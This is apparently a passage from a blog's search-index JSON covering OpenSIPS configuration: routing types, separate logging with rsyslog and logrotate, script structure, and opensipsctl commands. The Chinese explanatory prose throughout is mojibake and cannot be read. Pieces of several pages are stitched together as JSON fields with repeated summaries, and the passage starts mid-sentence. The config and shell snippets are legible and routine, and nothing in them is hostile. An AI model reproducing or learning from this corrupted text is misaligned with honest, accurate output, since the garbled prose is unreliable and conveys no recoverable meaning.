ä»»ä½•è¯­å¥çš„æƒ…å†µï¼Œå¦åˆ™å°†ä¼šå¯¼è‡´opensipsæ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œä¾‹å¦‚ä¸‹é¢\nroute[some_xxx]{ } ä¸»è·¯ç”±åˆ†ä¸ºå‡ ç±»\nè¯·æ±‚è·¯ç”± åˆ†æ”¯è·¯ç”± å¤±è´¥è·¯ç”± å“åº”è·¯ç”± æœ¬åœ°è·¯ç”± å¯åŠ¨è·¯ç”± å®šæ—¶å™¨è·¯ç”± äº‹ä»¶è·¯ç”± é”™è¯¯è·¯ç”± inspectï¼šæŸ¥çœ‹sipæ¶ˆæ¯å†…å®¹ modifies: ä¿®æ”¹sipæ¶ˆæ¯å†…å®¹ï¼Œä¾‹å¦‚ä¿®æ”¹request url drop: ä¸¢å¼ƒsipè¯·æ±‚ forking: å¯ä»¥ç†è§£ä¸ºå‘èµ·ä¸€ä¸ªinvite, ç„¶åå¯ä»¥æ‹¨æ‰“å¤šä¸ªäºº signaling: ä¿¡ä»¤å±‚çš„æ“ä½œï¼Œä¾‹å¦‚è¿”å›200okä¹‹ç±»çš„\nè·¯ç”± æ˜¯å¦å¿…é¡» é»˜è®¤è¡Œä¸º å¯ä»¥åš ä¸å¯ä»¥åš è§¦å‘æ–¹å‘ è§¦å‘æ¬¡æ•° è¯·æ±‚è·¯ç”± æ˜¯ drop inspect,modifies, drop, signaling incoming, inbound åˆ†æ”¯è·¯ç”± å¦ send out forking, modifies, drop, inspect relaying, replying,signaling outbound, outgoing, branch frok ä¸€ä¸ªè¯·æ±‚/äº‹åŠ¡ä¸€æ¬¡ å¤±è´¥è·¯ç”± å¦ å°†é”™è¯¯è¿”å›ç»™äº§ç”Ÿè€… signalingï¼Œreplying, inspect incoming ä¸€ä¸ªè¯·æ±‚/äº‹åŠ¡ä¸€æ¬¡ å“åº”è·¯ç”± å¦ relay back inspect, modifies signaling incoming, inbound ä¸€ä¸ªè¯·æ±‚/äº‹åŠ¡ä¸€æ¬¡ æœ¬åœ°è·¯ç”± å¦ send out signaling outbound æœ¬åœ°è·¯ç”±åªèƒ½æœ‰ä¸€ä¸ª å‰©ä¸‹çš„å¯åŠ¨è·¯ç”±ï¼Œå®šæ—¶å™¨è·¯ç”±ï¼Œäº‹ä»¶è·¯ç”±ï¼Œé”™è¯¯è·¯ç”±åªèƒ½ç”¨æ¥åšå’Œsipæ¶ˆæ¯æ— å…³çš„äº‹æƒ…ã€‚\nè¯·æ±‚è·¯ç”± è¯·æ±‚è·¯ç”±å› ä¸ºå—åˆ°ä»å¤–éƒ¨ç½‘ç»œæ¥çš„è¯·æ±‚è€Œè§¦å‘ã€‚\n# ä¸»è·¯ç”± route { ...... if (is_method(\u0026#34;INVITE\u0026#34;)) { route(check_hdrs,1); # è°ƒç”¨å­è·¯ç”±check_hdrsï¼Œ1æ˜¯ä¼ é€’ç»™å­è·¯ç”±çš„å‚æ•° if ($rc\u0026lt;0) # ä½¿ç”¨$rcè·å–ä¸Šä¸ªå­è·¯ç”±çš„å¤„ç†ç»“æœ exit; } } # sub-route route[check_hdrs] { if (!is_present_hf(\u0026#34;Content-Type\u0026#34;)) return(-1); if ( $param(1)==1 \u0026amp;\u0026amp; !has_body() ) # å­è·¯ç”±ä½¿ç”¨$param(1), è·å–ä¼ é€’çš„ç¬¬ä¸€ä¸ªå‚æ•° return(-2); # ä½¿ç”¨return() è¿”å›å­è·¯ç”±çš„å¤„ç†ç»“æœ return(1); } $rcå’Œ$retcodeéƒ½å¯ä»¥è·å–å­è·¯ç”±çš„è¿”å›ç»“æœã€‚\nè¯·æ±‚è·¯ç”±æ˜¯å¿…é¡»çš„ä¸€ä¸ªè·¯ç”±ï¼Œæ‰€æœ‰ä»ç½‘ç»œè¿‡æ¥çš„è¯·æ±‚ï¼Œéƒ½ä¼šç»è¿‡è¯·æ±‚è·¯ç”±ã€‚\nåœ¨è¯·æ±‚è·¯ç”±ä¸­ï¼Œå¯ä»¥åšä¸‰ä¸ªåŠ¨ä½œ\nç»™å‡ºå“åº” å‘å‰ä¼ é€’ ä¸¢å¼ƒè¿™ä¸ªè¯·æ±‚ æ³¨æ„äº‹é¡¹ï¼š\nrequestè·¯ç”±è¢«åˆ°è¾¾çš„sipè¯·æ±‚è§¦å‘ é»˜è®¤çš„åŠ¨ä½œæ˜¯ä¸¢å¼ƒè¿™ä¸ªè¯·æ±‚ åˆ†æ”¯è·¯ç”± æ³¨æ„äº‹é¡¹ï¼š\nrequestè·¯ç”±è¢«åˆ°è¾¾çš„sipè¯·æ±‚è§¦å‘ é»˜è®¤çš„åŠ¨ä½œæ˜¯å‘å‡ºè¿™ä¸ªè¯·æ±‚ t_on_branchå¹¶ä¸æ˜¯ç«‹å³æ‰§è¡Œåˆ†æ”¯è·¯ç”±ï¼Œè€Œæ˜¯æ³¨å†Œåˆ†æ”¯è·¯ç”±çš„å¤„ç†äº‹ä»¶ æ³¨æ„æ‰€æœ‰**t_on_**å¼€å¤´çš„å‡½æ•°éƒ½æ˜¯æ³¨å†Œé’©å­ï¼Œè€Œä¸æ˜¯ç«‹å³æ‰§è¡Œã€‚æ³¨å†Œé’©å­å¯ä»¥ç†è§£ä¸ºä¸æ˜¯ç°åœ¨æ‰§è¡Œï¼Œè€Œæ˜¯æœªæ¥æŸä¸ªæ—¶é—´ä¼šè¢«è§¦å‘æ‰§è¡Œã€‚ åˆ†æ”¯è·¯ç”±åªèƒ½ç”¨æ¥è§¦å‘ä¸€æ¬¡ï¼Œå¤šæ¬¡è§¦å‘å°†ä¼šé‡å†™ ä½ å¯ä»¥åœ¨è¿™ä¸ªè·¯ç”±ä¸­ä¿®æ”¹sip request url, ä½†æ˜¯ä¸èƒ½æ‰§è¡Œreplyç­‰ä¿¡ä»¤æ–¹é¢çš„æ“ä½œ route{ ... t_on_branch(\u0026#34;nat_filter\u0026#34;) ... } branch_route[nat_filter]{ } å¤±è´¥çš„è·¯ç”± å½“æ”¶åˆ°å¤§äºç­‰äº300çš„å“åº”æ—¶è§¦å‘å¤±è´¥è·¯ç”± route{ ... t_on_failure(\u0026#34;vm_redirect\u0026#34;) ... } failure_route[vm_redirects]{ } å“åº”è·¯ç”± å½“æ”¶åˆ°å“åº”æ—¶è§¦å‘ï¼ŒåŒ…æ‹¬1xx-6xxçš„æ‰€æœ‰å“åº”ã€‚\nå“åº”è·¯ç”±åˆ†ä¸ºä¸¤ç±»\nå…¨å±€å“åº”è·¯ç”±ï¼Œå³ä¸å¸¦åç§°çš„onreply_route{}, è‡ªåŠ¨è§¦å‘ï¼Œåœ¨å¸¦åå“åº”è·¯ç”±å‰æ‰§è¡Œã€‚ å¸¦åç§°çš„å“åº”è·¯ç”±ï¼Œå³onreplay_route[some_name]{}ï¼Œéœ€è¦ç”¨t_on_reply()æ–¹æ³•æ¥è®¾ç½®è§¦å‘ã€‚ route{ t_on_reply(\u0026#34;inspect_reply\u0026#34;); } onreply_route{ xlog(\u0026#34;$rm/$rs/$si/$ci: global onreply route\u0026#34;); } onreply_route[inspect_reply]{ if ( t_check_status(\u0026#34;1[0-9][0-9]\u0026#34;) ) { xlog(\u0026#34;provisional reply $T_reply_code received\\n\u0026#34;); } if ( t_check_status(\u0026#34;2[0-9][0-9]\u0026#34;) ) { xlog(\u0026#34;successful reply $T_reply_code received\\n\u0026#34;); remove_hf(\u0026#34;User-Agent\u0026#34;); } else { xlog(\u0026#34;non-2xx reply $T_reply_code received\\n\u0026#34;); } } æœ¬åœ°è·¯ç”± æœ‰äº›è¯·æ±‚æ˜¯opensipsè‡ªå·±å‘çš„ï¼Œè¿™æ—¶å€™è§¦å‘æœ¬åœ°è·¯ç”±ã€‚ä½¿ç”¨åœºæ™¯ï¼šåœ¨å¤šäººä¼šè®®æ—¶ï¼Œopensipså¯ä»¥ç»™å¤šäººå‘é€byeæ¶ˆæ¯ã€‚\nlocal_route { } å¯åŠ¨è·¯ç”± å¯ä»¥è®©ä½ åœ¨opensipså¯åŠ¨æ—¶åšäº›åˆå§‹åŒ–æ“ä½œ\næ³¨æ„å¯åŠ¨è·¯ç”±é‡Œé¢ä¸€å®šè¦æœ‰è¯­å¥ï¼Œå“ªæ€•æ˜¯å†™ä¸ªxlog(\u0026ldquo;hello\u0026rdquo;), å¦åˆ™opensipså°†ä¼šæ— æ³•å¯åŠ¨ã€‚\nstartup_route { } è®¡æ—¶å™¨è·¯ç”± åœ¨æŒ‡å®šçš„å‘¨æœŸï¼Œè§¦å‘è·¯ç”±ã€‚å¯ä»¥ç”¨æ¥æ›´æ–°æœ¬åœ°ç¼“å­˜ã€‚\næ³¨æ„è®¡æ—¶å™¨è·¯ç”±é‡Œé¢ä¸€å®šè¦æœ‰è¯­å¥ï¼Œå“ªæ€•æ˜¯å†™ä¸ªxlog(\u0026ldquo;hello\u0026rdquo;), å¦åˆ™opensipså°†ä¼šæ— æ³•å¯åŠ¨ã€‚\nå¦‚ï¼šæ¯éš”120ç§’ï¼Œåšä¸ªäº‹æƒ…\ntimer_route[gw_update, 120] { # update the local cache if signalized if ($shv(reload) == 1 ) { avp_db_query(\u0026#34;select gwlist from routing where id=10\u0026#34;, \u0026#34;$avp(list)\u0026#34;); cache_store(\u0026#34;local\u0026#34;,\u0026#34;gwlist10\u0026#34;,\u0026#34; $avp(list)\u0026#34;); } } äº‹ä»¶è·¯ç”± å½“æ”¶åˆ°æŸäº›äº‹ä»¶æ˜¯è§¦å‘ï¼Œä¾‹å¦‚æ—¥å¿—ï¼Œæ•°æ®åº“æ“ä½œï¼Œæ•°æ®æ›´æ–°ï¼ŒæŸäº›\nåœ¨äº‹ä»¶è·¯ç”±çš„å†…éƒ¨ï¼Œå¯ä»¥ä½¿ç”¨$param(key)çš„æ–¹å¼è·å–äº‹ä»¶çš„æŸäº›å±æ€§ã€‚\nxlog(\u0026#34;first parameters is $param(1)\\n\u0026#34;); # æ ¹æ®åºå· xlog(\u0026#34;Pike Blocking IP is $param(ip)\\n\u0026#34;); # æ ¹æ®key event_route[E_DISPATCHER_STATUS] { } event_route[E_PIKE_BLOCKED] { xlog(\u0026#34;IP $param(ip) has been blocked\\n\u0026#34;); } æ›´å¤šå¯ä»¥å‚è€ƒï¼šÂ https://opensips.org/html/docs/modules/devel/event_route.html\né”™è¯¯è·¯ç”± ç”¨æ¥æ•è·è¿è¡Œæ—¶é”™è¯¯ï¼Œä¾‹å¦‚è§£æsipæ¶ˆæ¯å‡ºé”™ã€‚\nerror_route { xlog(\u0026#34;$rm from $si:$sp - error level=$(err.level), info=$(err.info)\\n\u0026#34;); sl_send_reply(\u0026#34;$err.rcode\u0026#34;, \u0026#34;$err.rreason\u0026#34;); exit; } ","permalink":"https://wdd.js.org/opensips/ch5/routing-type/","summary":"opensipsè·¯ç”±åˆ†ä¸ºä¸¤ç±»ï¼Œä¸»è·¯ç”±å’Œå­è·¯ç”±ã€‚ä¸»è·¯ç”±è¢«opensipsè°ƒç”¨ï¼Œå­è·¯ç”±åœ¨ä¸»è·¯ç”±ä¸­è¢«è°ƒç”¨ã€‚å¯ä»¥ç†è§£å­è·¯ç”±æ˜¯ä¸€ç§å‡½æ•°ã€‚\næ‰€æœ‰è·¯ç”±ä¸­ä¸å…è®¸å‡ºç°æ— ä»»ä½•è¯­å¥çš„æƒ…å†µï¼Œå¦åˆ™å°†ä¼šå¯¼è‡´opensipsæ— æ³•æ­£å¸¸å¯åŠ¨ï¼Œä¾‹å¦‚ä¸‹é¢\nroute[some_xxx]{ } ä¸»è·¯ç”±åˆ†ä¸ºå‡ ç±»\nè¯·æ±‚è·¯ç”± åˆ†æ”¯è·¯ç”± å¤±è´¥è·¯ç”± å“åº”è·¯ç”± æœ¬åœ°è·¯ç”± å¯åŠ¨è·¯ç”± å®šæ—¶å™¨è·¯ç”± äº‹ä»¶è·¯ç”± é”™è¯¯è·¯ç”± inspectï¼šæŸ¥çœ‹sipæ¶ˆæ¯å†…å®¹ modifies: ä¿®æ”¹sipæ¶ˆæ¯å†…å®¹ï¼Œä¾‹å¦‚ä¿®æ”¹request url drop: ä¸¢å¼ƒsipè¯·æ±‚ forking: å¯ä»¥ç†è§£ä¸ºå‘èµ·ä¸€ä¸ªinvite, ç„¶åå¯ä»¥æ‹¨æ‰“å¤šä¸ªäºº signaling: ä¿¡ä»¤å±‚çš„æ“ä½œï¼Œä¾‹å¦‚è¿”å›200okä¹‹ç±»çš„\nè·¯ç”± æ˜¯å¦å¿…é¡» é»˜è®¤è¡Œä¸º å¯ä»¥åš ä¸å¯ä»¥åš è§¦å‘æ–¹å‘ è§¦å‘æ¬¡æ•° è¯·æ±‚è·¯ç”± æ˜¯ drop inspect,modifies, drop, signaling incoming, inbound åˆ†æ”¯è·¯ç”± å¦ send out forking, modifies, drop, inspect relaying, replying,signaling outbound, outgoing, branch frok ä¸€ä¸ªè¯·æ±‚/äº‹åŠ¡ä¸€æ¬¡ å¤±è´¥è·¯ç”± å¦ å°†é”™è¯¯è¿”å›ç»™äº§ç”Ÿè€… signalingï¼Œreplying, inspect incoming ä¸€ä¸ªè¯·æ±‚/äº‹åŠ¡ä¸€æ¬¡ å“åº”è·¯ç”± å¦ relay back inspect, modifies signaling incoming, inbound ä¸€ä¸ªè¯·æ±‚/äº‹åŠ¡ä¸€æ¬¡ æœ¬åœ°è·¯ç”± å¦ send out signaling outbound æœ¬åœ°è·¯ç”±åªèƒ½æœ‰ä¸€ä¸ª å‰©ä¸‹çš„å¯åŠ¨è·¯ç”±ï¼Œå®šæ—¶å™¨è·¯ç”±ï¼Œäº‹ä»¶è·¯ç”±ï¼Œé”™è¯¯è·¯ç”±åªèƒ½ç”¨æ¥åšå’Œsipæ¶ˆæ¯æ— å…³çš„äº‹æƒ…ã€‚","title":"è·¯ç”±åˆ†ç±»"},{"content":"è®¾ç½®ç‹¬ç«‹æ—¥å¿— é»˜è®¤æƒ…å†µä¸‹ï¼Œopensipsçš„æ—¥å¿—ä¼šå†™åœ¨ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶/var/log/messageä¸­ï¼Œä¸ºäº†é¿å…éš¾ä»¥æŸ¥é˜…æ—¥å¿—ï¼Œæˆ‘ä»¬å¯ä»¥å°†opensipsçš„æ—¥å¿—å†™åˆ°å•ç‹¬çš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚\nç¯å¢ƒè¯´æ˜\ndebian buster\nè¿™ä¸ªéœ€è¦åšä¸¤æ­¥ã€‚\nç¬¬ä¸€æ­¥ï¼Œé…ç½®opensips.cfgæ–‡ä»¶\nlog_facility=LOG_LOCAL0 ç¬¬äºŒæ­¥, åˆ›å»ºæ—¥å¿—é…ç½®æ–‡ä»¶\necho \u0026#34;local0.* -/var/log/opensips.log\u0026#34; \u0026gt; /etc/rsyslog.d/opensips.conf ç¬¬ä¸‰æ­¥ï¼Œåˆ›å»ºæ—¥å¿—æ–‡ä»¶\ntouch /var/log/opensips.log ç¬¬å››æ­¥ï¼Œé‡å¯rsyslogå’Œopensips\nservice rsyslog restart opensipsctl restart ç¬¬äº”æ­¥ï¼ŒéªŒè¯ç»“æœ\ntail /var/log/opensips.log æ—¥å¿—å›æ»š ä¸ºäº†é¿å…æ—¥å¿—æ–‡ä»¶å ç”¨è¿‡å¤šç£ç›˜ç©ºé—´ï¼Œéœ€è¦åšæ—¥å¿—å›æ»šã€‚\nå®‰è£…logrotate apt install logrotate -y æ—¥å¿—å›æ»šé…ç½®æ–‡ä»¶ /etc/logrotate.d/opensips\n/var/log/opensips.log { noolddir size 10M rotate 100 copytruncate compress sharedscripts postrotate /bin/kill -HUP `cat /var/run/syslogd.pid 2\u0026gt; /dev/null` 2\u0026gt; /dev/null || true /bin/kill -HUP `cat /var/run/rsyslogd.pid 2\u0026gt; /dev/null` 2\u0026gt; /dev/null || true endscript } é…ç½®å®šæ—¶ä»»åŠ¡\n*/10 * * * * /usr/sbin/logrotate /etc/logrotate.d/opensips ","permalink":"https://wdd.js.org/opensips/ch3/log/","summary":"è®¾ç½®ç‹¬ç«‹æ—¥å¿— é»˜è®¤æƒ…å†µä¸‹ï¼Œopensipsçš„æ—¥å¿—ä¼šå†™åœ¨ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶/var/log/messageä¸­ï¼Œä¸ºäº†é¿å…éš¾ä»¥æŸ¥é˜…æ—¥å¿—ï¼Œæˆ‘ä»¬å¯ä»¥å°†opensipsçš„æ—¥å¿—å†™åˆ°å•ç‹¬çš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚\nç¯å¢ƒè¯´æ˜\ndebian buster\nè¿™ä¸ªéœ€è¦åšä¸¤æ­¥ã€‚\nç¬¬ä¸€æ­¥ï¼Œé…ç½®opensips.cfgæ–‡ä»¶\nlog_facility=LOG_LOCAL0 ç¬¬äºŒæ­¥, åˆ›å»ºæ—¥å¿—é…ç½®æ–‡ä»¶\necho \u0026#34;local0.* -/var/log/opensips.log\u0026#34; \u0026gt; /etc/rsyslog.d/opensips.conf ç¬¬ä¸‰æ­¥ï¼Œåˆ›å»ºæ—¥å¿—æ–‡ä»¶\ntouch /var/log/opensips.log ç¬¬å››æ­¥ï¼Œé‡å¯rsyslogå’Œopensips\nservice rsyslog restart opensipsctl restart ç¬¬äº”æ­¥ï¼ŒéªŒè¯ç»“æœ\ntail /var/log/opensips.log æ—¥å¿—å›æ»š ä¸ºäº†é¿å…æ—¥å¿—æ–‡ä»¶å ç”¨è¿‡å¤šç£ç›˜ç©ºé—´ï¼Œéœ€è¦åšæ—¥å¿—å›æ»šã€‚\nå®‰è£…logrotate apt install logrotate -y æ—¥å¿—å›æ»šé…ç½®æ–‡ä»¶ /etc/logrotate.d/opensips\n/var/log/opensips.log { noolddir size 10M rotate 100 copytruncate compress sharedscripts postrotate /bin/kill -HUP `cat /var/run/syslogd.pid 2\u0026gt; /dev/null` 2\u0026gt; /dev/null || true /bin/kill -HUP `cat /var/run/rsyslogd.pid 2\u0026gt; /dev/null` 2\u0026gt; /dev/null || true endscript } é…ç½®å®šæ—¶ä»»åŠ¡","title":"è®¾ç½®ç‹¬ç«‹æ—¥å¿—æ–‡ä»¶"},{"content":"è„šæœ¬é¢„å¤„ç† å¦‚æœä½ çš„opensips.cfgæ–‡ä»¶ä¸å¤§ï¼Œå¯ä»¥å†™æˆä¸€ä¸ªæ–‡ä»¶ã€‚å¦åˆ™å»ºè®®ä½¿ç”¨include_fileå¼•å…¥é…ç½®æ–‡ä»¶ã€‚\ninclude_file \u0026#34;global.cfg\u0026#34; æœ‰äº›é…ç½®ï¼Œå»ºè®®ä½¿ç”¨m4å®å¤„ç†ã€‚\nè„šæœ¬ç»“æ„ ####### Global Parameters ######### debug=3 log_stderror=no fork=yes children=4 listen=udp:127.0.0.1:5060 ####### Modules Section ######## mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;signaling.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;rr.so\u0026#34; loadmodule \u0026#34;uri.so\u0026#34; loadmodule \u0026#34;sipmsgops.so\u0026#34; modparam(\u0026#34;rr\u0026#34;, \u0026#34;append_fromtag\u0026#34;, 0) ####### Routing Logic ######## route{ if ( has_totag() ) { loose_route(); route(relay); } if ( from_uri!=myself \u0026amp;\u0026amp; uri!=myself ) { send_reply(\u0026#34;403\u0026#34;,\u0026#34;Rely forbidden\u0026#34;); exit; } record_route(); route(relay); } route[relay] { if (is_method(\u0026#34;INVITE\u0026#34;)) t_on_failure(\u0026#34;missed_call\u0026#34;); t_relay(); exit; } failure_route[missed_call] { if (t_check_status(\u0026#34;486\u0026#34;)) { $rd = \u0026#34;127.0.0.10\u0026#34;; t_relay(); } } è„šæœ¬ä¸€èˆ¬ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼š\nå…¨å±€å‚æ•°é…ç½® æ¨¡å—åŠ è½½ä¸å‚æ•°é…ç½® è·¯ç”±é€»è¾‘ å…¨å±€å‚æ•°é…ç½® debug=2 # log level 2 (NOTICE) debugå€¼è¶Šå¤§ï¼Œæ—¥å¿—è¶Šè¯¦ç»† log_stderror=0 #log to syslog log_facility=LOG_LOCAL0 log_name=\u0026#34;sbc\u0026#34; listen=udp:127.0.0.1:5060 listen=tcp:192.168.1.5:5060 as 10.10.1.10:5060 listen=tls:192.168.1.5:5061 advertised_address=7.7.7.7 #global option, for all listeners æ¨¡å—åŠ è½½ä¸å‚æ•°é…ç½® æŒ‰ç…§ç»å¯¹è·¯å¾„åŠ è½½æ¨¡å—\nloadmodules \u0026#34;/lib/opensips/modules/rr.so\u0026#34; loadmodules \u0026#34;/lib/opensips/modules/tm.so\u0026#34; ç»Ÿä¸€å‰ç¼€åŠ è½½æ¨¡å—\nmpath=\u0026#34;/lib/opensips/modules/\u0026#34; loadmodules \u0026#34;rr.so\u0026#34; loadmodules \u0026#34;tm.so\u0026#34; ","permalink":"https://wdd.js.org/opensips/ch5/routing-script/","summary":"è„šæœ¬é¢„å¤„ç† å¦‚æœä½ çš„opensips.cfgæ–‡ä»¶ä¸å¤§ï¼Œå¯ä»¥å†™æˆä¸€ä¸ªæ–‡ä»¶ã€‚å¦åˆ™å»ºè®®ä½¿ç”¨include_fileå¼•å…¥é…ç½®æ–‡ä»¶ã€‚\ninclude_file \u0026#34;global.cfg\u0026#34; æœ‰äº›é…ç½®ï¼Œå»ºè®®ä½¿ç”¨m4å®å¤„ç†ã€‚\nè„šæœ¬ç»“æ„ ####### Global Parameters ######### debug=3 log_stderror=no fork=yes children=4 listen=udp:127.0.0.1:5060 ####### Modules Section ######## mpath=\u0026#34;/usr/local/lib/opensips/modules/\u0026#34; loadmodule \u0026#34;signaling.so\u0026#34; loadmodule \u0026#34;sl.so\u0026#34; loadmodule \u0026#34;tm.so\u0026#34; loadmodule \u0026#34;rr.so\u0026#34; loadmodule \u0026#34;uri.so\u0026#34; loadmodule \u0026#34;sipmsgops.so\u0026#34; modparam(\u0026#34;rr\u0026#34;, \u0026#34;append_fromtag\u0026#34;, 0) ####### Routing Logic ######## route{ if ( has_totag() ) { loose_route(); route(relay); } if ( from_uri!=myself \u0026amp;\u0026amp; uri!=myself ) { send_reply(\u0026#34;403\u0026#34;,\u0026#34;Rely forbidden\u0026#34;); exit; } record_route(); route(relay); } route[relay] { if (is_method(\u0026#34;INVITE\u0026#34;)) t_on_failure(\u0026#34;missed_call\u0026#34;); t_relay(); exit; } failure_route[missed_call] { if (t_check_status(\u0026#34;486\u0026#34;)) { $rd = \u0026#34;127.","title":"é…ç½®æ–‡ä»¶"},{"content":"å¯ä»¥ä½¿ç”¨ä¸€ä¸‹å‘½ä»¤æŸ¥æ‰¾opensipsçš„ç›¸å…³æ–‡ä»¶å¤¹\nfind / -name opensips -type d ä¸€èˆ¬æ¥è¯´ï¼Œé‡è¦çš„æ˜¯opensips.cfgæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸€èˆ¬ä½äº/usr/local/etc/opensips/æˆ–è€…/usr/etc/opensipsä¸­ã€‚ä¸»è¦è¿˜æ˜¯è¦çœ‹å®‰è£…æ—¶é€‰æ‹©çš„é»˜è®¤è·¯å¾„ã€‚\nå…¶ä¸­1.xç‰ˆæœ¬çš„é…ç½®æ–‡ä»¶ä¸€èˆ¬ä½äº/usr/etc/opensipsç›®å½•ä¸­ï¼Œ2.xç‰ˆæœ¬çš„é…ç½®ä¸€èˆ¬ä½äº/usr/local/etc/opensipsç›®å½•ä¸­ã€‚\nä¸‹é¢ä¸»è¦è®²è§£å‡ ä¸ªå‘½ä»¤ã€‚\né…ç½®æ–‡ä»¶æ ¡éªŒ æ ¡éªŒopensips.cfgè„šæœ¬æ˜¯å¦åˆæ³•, å¦‚æœæœ‰é—®é¢˜ï¼Œä¼šæç¤ºé‚£è¡Œä»£ç æœ‰é—®é¢˜ï¼Œä½†æ˜¯æŠ¥é”™ä½ç½®å¥½åƒä¸€ç›´ä¸å‡†ç¡®ã€‚å¾ˆå¤šæ—¶å€™å¯èƒ½æ˜¯å¿˜è®°å†™åˆ†å¥½äº†ã€‚\nopensips -C opensips.cfg å¯åŠ¨å…³é—­ä¸é‡å¯ ä½¿ç”¨opensipsctlå‘½ä»¤åšæ•°æ®åº“æ“ä½œå‰ï¼Œéœ€è¦å…ˆé…ç½®opensipsctlrcæ–‡ä»¶\nopensips start|stop|restart opensipsctl start|stop|restart èµ„æºåˆ›å»º opensipsdbctl create # åˆ›å»ºæ•°æ®åº“ opensipsctl domain add abc.cc #åˆ›å»ºåŸŸå opensipsctl add 1001@test.cc 12346 # æ–°å¢ç”¨æˆ· opensipsctl rm 1001@test.cc # åˆ é™¤ç”¨æˆ· opensipsctl passwdd 1001@test.cc 09879 # ä¿®æ”¹å¯†ç  opensipsctl -h æ˜¾ç¤ºæ‰€æœ‰å¯ç”¨å‘½ä»¤\n/usr/local/sbin/opensipsctl $Revision: 4448 $ Existing commands: -- command \u0026#39;start|stop|restart|trap\u0026#39; trap ............................... trap with gdb OpenSIPS processes restart ............................ restart OpenSIPS start .............................. start OpenSIPS stop ............................... stop OpenSIPS -- command \u0026#39;acl\u0026#39; - manage access control lists (acl) acl show [\u0026lt;username\u0026gt;] .............. show user membership acl grant \u0026lt;username\u0026gt; \u0026lt;group\u0026gt; ....... grant user membership (*) acl revoke \u0026lt;username\u0026gt; [\u0026lt;group\u0026gt;] .... grant user membership(s) (*) -- command \u0026#39;cr\u0026#39; - manage carrierroute tables cr show ....................................................... show tables cr reload ..................................................... reload tables cr dump ....................................................... show in memory tables cr addrt \u0026lt;routing_tree_id\u0026gt; \u0026lt;routing_tree\u0026gt; ..................... add a tree cr rmrt \u0026lt;routing_tree\u0026gt; ....................................... rm a tree cr addcarrier \u0026lt;carrier\u0026gt; \u0026lt;scan_prefix\u0026gt; \u0026lt;domain\u0026gt; \u0026lt;rewrite_host\u0026gt; ................ \u0026lt;prob\u0026gt; \u0026lt;strip\u0026gt; \u0026lt;rewrite_prefix\u0026gt; \u0026lt;rewrite_suffix\u0026gt; ............... \u0026lt;flags\u0026gt; \u0026lt;mask\u0026gt; \u0026lt;comment\u0026gt; .........................add a carrier (prob, strip, rewrite_prefix, rewrite_suffix,................... flags, mask and comment are optional arguments) ............... cr rmcarrier \u0026lt;carrier\u0026gt; \u0026lt;scan_prefix\u0026gt; \u0026lt;domain\u0026gt; ................ rm a carrier -- command \u0026#39;rpid\u0026#39; - manage Remote-Party-ID (RPID) rpid add \u0026lt;username\u0026gt; \u0026lt;rpid\u0026gt; ......... add rpid for a user (*) rpid rm \u0026lt;username\u0026gt; ................. set rpid to NULL for a user (*) rpid show \u0026lt;username\u0026gt; ............... show rpid of a user -- command \u0026#39;add|passwd|rm\u0026#39; - manage subscribers add \u0026lt;username\u0026gt; \u0026lt;password\u0026gt; .......... add a new subscriber (*) passwd \u0026lt;username\u0026gt; \u0026lt;passwd\u0026gt; ......... change user\u0026#39;s password (*) rm \u0026lt;username\u0026gt; ...................... delete a user (*) -- command \u0026#39;add|dump|reload|rm|show\u0026#39; - manage address address show ...................... show db content address dump ...................... show cache content address reload .................... reload db table into cache address add \u0026lt;grp\u0026gt; \u0026lt;ip\u0026gt; \u0026lt;mask\u0026gt; \u0026lt;port\u0026gt; \u0026lt;proto\u0026gt; [\u0026lt;context_info\u0026gt;] [\u0026lt;pattern\u0026gt;] ....................... add a new entry ....................... (from_pattern and tag are optional arguments) address rm \u0026lt;grp\u0026gt; \u0026lt;ip\u0026gt; \u0026lt;mask\u0026gt; \u0026lt;port\u0026gt; ............... remove all entries ....................... for the given grp ip mask port -- command \u0026#39;dr\u0026#39; - manage dynamic routing * Examples: dr addgw \u0026#39;1\u0026#39; 10 \u0026#39;192.168.2.2\u0026#39; 0 \u0026#39;\u0026#39; \u0026#39;GW001\u0026#39; 0 \u0026#39;first_gw\u0026#39; * dr addgw \u0026#39;2\u0026#39; 20 \u0026#39;192.168.2.3\u0026#39; 0 \u0026#39;\u0026#39; \u0026#39;GW002\u0026#39; 0 \u0026#39;second_gw\u0026#39; * dr rmgw 2 * dr addgrp \u0026#39;alice\u0026#39; \u0026#39;example.com\u0026#39; 10 \u0026#39;first group\u0026#39; * dr rmgrp 1 * dr addcr \u0026#39;cr_1\u0026#39; \u0026#39;10\u0026#39; 0 \u0026#39;CARRIER_1\u0026#39; \u0026#39;first_carrier\u0026#39; * dr rmcr 1 * dr addrule \u0026#39;10,20\u0026#39; \u0026#39;+1\u0026#39; \u0026#39;20040101T083000\u0026#39; 0 0 \u0026#39;1,2\u0026#39; \u0026#39;NA_RULE\u0026#39; \u0026#39;NA routing\u0026#39; * dr rmrule 1 dr show ............................ show dr tables dr addgw \u0026lt;gwid\u0026gt; \u0026lt;type\u0026gt; \u0026lt;address\u0026gt; \u0026lt;strip\u0026gt; \u0026lt;pri_prefix\u0026gt; \u0026lt;attrs\u0026gt; \u0026lt;probe_mode\u0026gt; \u0026lt;description\u0026gt; ................................. add gateway dr rmgw \u0026lt;id\u0026gt; ....................... delete gateway dr addgrp \u0026lt;username\u0026gt; \u0026lt;domain\u0026gt; \u0026lt;groupid\u0026gt; \u0026lt;description\u0026gt; ................................. add gateway group dr rmgrp \u0026lt;id\u0026gt; ...................... delete gateway group dr addcr \u0026lt;carrierid\u0026gt; \u0026lt;gwlist\u0026gt; \u0026lt;flags\u0026gt; \u0026lt;attrs\u0026gt; \u0026lt;description\u0026gt; ........................... add carrier dr rmcr \u0026lt;id\u0026gt; ....................... delete carrier dr addrule \u0026lt;groupid\u0026gt; \u0026lt;prefix\u0026gt; \u0026lt;timerec\u0026gt; \u0026lt;priority\u0026gt; 